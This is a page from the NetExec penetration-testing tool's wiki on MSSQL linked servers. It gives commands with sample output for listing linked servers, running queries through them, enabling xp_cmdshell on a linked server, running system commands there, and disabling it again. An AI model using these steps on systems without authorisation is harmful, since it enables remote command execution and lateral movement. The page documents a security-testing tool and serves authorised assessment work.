{"title": "MSSQL Linked Servers", "source": "netexec", "source_label": "NetExec Wiki", "path": "mssql-protocol/mssql-linked-servers", "html": "<h1 id=\"mssql-linked-servers\">MSSQL Linked Servers</h1>\n<p>MSSQL linked servers allow a database instance to establish a trusted connection to another database across domain or forest trusts, allowing users to query data and execute commands on remote databases.</p>\n<h2 id=\"find-linked-servers\">Find Linked Servers</h2>\n<p>The <code>enum_links</code> module queries the database to enumerate configured MSSQL linked servers.<br>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>mssql<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>enum_links<span class=\"w\">   </span>\nMSSQL<span class=\"w\">       </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Windows<span class=\"w\"> </span><span class=\"m\">10</span><span class=\"w\"> </span>/<span class=\"w\"> </span>Server<span class=\"w\"> </span><span class=\"m\">2019</span><span class=\"w\"> </span>Build<span class=\"w\"> </span><span class=\"m\">17763</span><span class=\"w\"> </span><span class=\"o\">(</span>name:FQDN<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>domain:FQDN.local<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>EncryptionReq:False<span class=\"o\">)</span>\nMSSQL<span class=\"w\">       </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>FQDN<span class=\"se\">\\u</span>ser:password<span class=\"w\"> </span>\nENUM_LINKS<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>Linked<span class=\"w\"> </span>servers<span class=\"w\"> </span>found:\nENUM_LINKS<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\">   </span>-<span class=\"w\"> </span>BRAAVOS\nENUM_LINKS<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\">   </span>-<span class=\"w\"> </span>FQDN<span class=\"se\">\\S</span>QLEXPRESS\n</code></pre></div></p>\n<h2 id=\"execute-mssql-queries-on-a-linked-server\">Execute MSSQL Queries on a Linked Server</h2>\n<p>Execute a MSSQL query specified in the COMMAND argument on the linked server specified in LINKED_SERVER.<br>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>mssql<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>exec_on_link<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">LINKED_SERVER</span><span class=\"o\">=</span>BRAAVOS<span class=\"w\"> </span><span class=\"nv\">COMMAND</span><span class=\"o\">=</span><span class=\"s1\">&#39;select @@servername&#39;</span>\nMSSQL<span class=\"w\">         </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Windows<span class=\"w\"> </span><span class=\"m\">10</span><span class=\"w\"> </span>/<span class=\"w\"> </span>Server<span class=\"w\"> </span><span class=\"m\">2019</span><span class=\"w\"> </span>Build<span class=\"w\"> </span><span class=\"m\">17763</span><span class=\"w\"> </span><span class=\"o\">(</span>name:FQDN<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>domain:FQDN.local<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>EncryptionReq:False<span class=\"o\">)</span>\nMSSQL<span class=\"w\">         </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>FQDN<span class=\"se\">\\u</span>ser:pass<span class=\"w\"> </span><span class=\"o\">(</span>Pwn3d!<span class=\"o\">)</span>\nEXEC_ON_LINK<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Command<span class=\"w\"> </span>output:<span class=\"w\"> </span><span class=\"o\">[{</span><span class=\"s1\">&#39;&#39;</span>:<span class=\"w\"> </span><span class=\"s1\">&#39;BRAAVOS\\\\SQLEXPRESS&#39;</span><span class=\"o\">}]</span>\n</code></pre></div></p>\n<h2 id=\"enable-xp_cmdshell-on-a-linked-server\">Enable xp_cmdshell on a Linked Server</h2>\n<p>Enable xp_cmdshell on the linked server to allow execution of system commands.<br>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>mssql<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>link_enable_cmdshell<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">LINKED_SERVER</span><span class=\"o\">=</span>BRAAVOS<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span><span class=\"nb\">enable</span>\nMSSQL<span class=\"w\">                 </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Windows<span class=\"w\"> </span><span class=\"m\">10</span><span class=\"w\"> </span>/<span class=\"w\"> </span>Server<span class=\"w\"> </span><span class=\"m\">2019</span><span class=\"w\"> </span>Build<span class=\"w\"> </span><span class=\"m\">17763</span><span class=\"w\"> </span><span class=\"o\">(</span>name:FQDN<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>domain:FQDN.local<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>EncryptionReq:False<span class=\"o\">)</span>\nMSSQL<span class=\"w\">                 </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>FQDN<span class=\"se\">\\u</span>ser:password<span class=\"w\"> </span><span class=\"o\">(</span>Pwn3d!<span class=\"o\">)</span>\nLINK_ENABLE_CMDSHELL<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Enabling<span class=\"w\"> </span>xp_cmdshell<span class=\"w\"> </span>on<span class=\"w\"> </span>BRAAVOS.<span class=\"w\"> </span>Current<span class=\"w\"> </span>value:<span class=\"w\"> </span>False\nLINK_ENABLE_CMDSHELL<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>xp_cmdshell<span class=\"w\"> </span>enabled<span class=\"w\"> </span>on<span class=\"w\"> </span>BRAAVOS\n</code></pre></div></p>\n<h2 id=\"command-execution-on-a-linked-server\">Command Execution on a Linked Server</h2>\n<p>Execute system commands on the linked server using xp_cmdshell.<br>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>mssql<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>link_xpcmd<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">LINKED_SERVER</span><span class=\"o\">=</span>BRAAVOS<span class=\"w\"> </span><span class=\"nv\">CMD</span><span class=\"o\">=</span><span class=\"s1\">&#39;whoami&#39;</span><span class=\"w\">           </span>\nMSSQL<span class=\"w\">       </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Windows<span class=\"w\"> </span><span class=\"m\">10</span><span class=\"w\"> </span>/<span class=\"w\"> </span>Server<span class=\"w\"> </span><span class=\"m\">2019</span><span class=\"w\"> </span>Build<span class=\"w\"> </span><span class=\"m\">17763</span><span class=\"w\"> </span><span class=\"o\">(</span>name:FQDN<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>domain:FQDN.local<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>EncryptionReq:False<span class=\"o\">)</span>\nMSSQL<span class=\"w\">       </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>FQDN<span class=\"se\">\\u</span>ser:password<span class=\"w\"> </span><span class=\"o\">(</span>Pwn3d!<span class=\"o\">)</span>\nLINK_XPCMD<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Running<span class=\"w\"> </span><span class=\"nb\">command</span><span class=\"w\"> </span>on<span class=\"w\"> </span>BRAAVOS:<span class=\"w\"> </span>whoami\nLINK_XPCMD<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>Executed<span class=\"w\"> </span><span class=\"nb\">command</span><span class=\"w\"> </span>via<span class=\"w\"> </span>linked<span class=\"w\"> </span>server\nLINK_XPCMD<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span>essos<span class=\"se\">\\s</span>ql_svc\n</code></pre></div></p>\n<h2 id=\"dont-forget-to-disable-xp_cmdshell-in-production\">Don't forget to disable xp_cmdshell in production!</h2>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>mssql<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-M<span class=\"w\"> </span>link_enable_cmdshell<span class=\"w\"> </span>-o<span class=\"w\"> </span><span class=\"nv\">LINKED_SERVER</span><span class=\"o\">=</span>BRAAVOS<span class=\"w\"> </span><span class=\"nv\">ACTION</span><span class=\"o\">=</span>disable\nMSSQL<span class=\"w\">                 </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Windows<span class=\"w\"> </span><span class=\"m\">10</span><span class=\"w\"> </span>/<span class=\"w\"> </span>Server<span class=\"w\"> </span><span class=\"m\">2019</span><span class=\"w\"> </span>Build<span class=\"w\"> </span><span class=\"m\">17763</span><span class=\"w\"> </span><span class=\"o\">(</span>name:FQDN<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>domain:FQDN.local<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>EncryptionReq:False<span class=\"o\">)</span>\nMSSQL<span class=\"w\">                 </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>FQDN<span class=\"se\">\\u</span>ser:password<span class=\"w\"> </span><span class=\"o\">(</span>Pwn3d!<span class=\"o\">)</span>\nLINK_ENABLE_CMDSHELL<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Disabling<span class=\"w\"> </span>xp_cmdshell<span class=\"w\"> </span>on<span class=\"w\"> </span>BRAAVOS.<span class=\"w\"> </span>Current<span class=\"w\"> </span>value:<span class=\"w\"> </span>True\nLINK_ENABLE_CMDSHELL<span class=\"w\">  </span>&lt;ip&gt;<span class=\"w\">      </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>xp_cmdshell<span class=\"w\"> </span>disabled<span class=\"w\"> </span>on<span class=\"w\"> </span>BRAAVOS\n</code></pre></div>", "excerpt": "MSSQL Linked Servers MSSQL linked servers allow a database instance to establish a trusted connection to another database across domain or forest trusts, allowing users to query data and execute commands on remote databases. Find Linked Servers The…", "tags": []}